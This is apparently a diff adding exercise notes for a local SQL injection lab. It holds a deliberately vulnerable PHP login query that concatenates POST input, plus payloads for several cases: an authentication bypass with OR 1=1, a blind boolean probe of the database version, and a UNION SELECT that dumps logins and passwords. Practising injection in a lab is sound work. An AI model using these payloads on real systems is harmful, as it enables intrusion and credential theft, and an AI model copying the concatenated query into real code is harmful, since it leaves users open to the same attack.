@@ -1,0 +1,15 @@
+1) 
+$sql  = "SELECT login, password FROM users WHERE login = '${_POST['login']}' AND password = SHA1('${_POST['password']}')";
+
+' OR 1 = 1;--  // пробел в конце!
+whatever
+
+
+2) 
+http://localhost:8081/cases/2/?month='' OR 1 = 1;--
+
+3) 
+http://localhost:8081/cases/3/?id=1 AND SUBSTR(@@version, 1, 1) = 5
+
+5)
+' UNION SELECT CONCAT(login, ':', password) from users WHERE '1' = '1
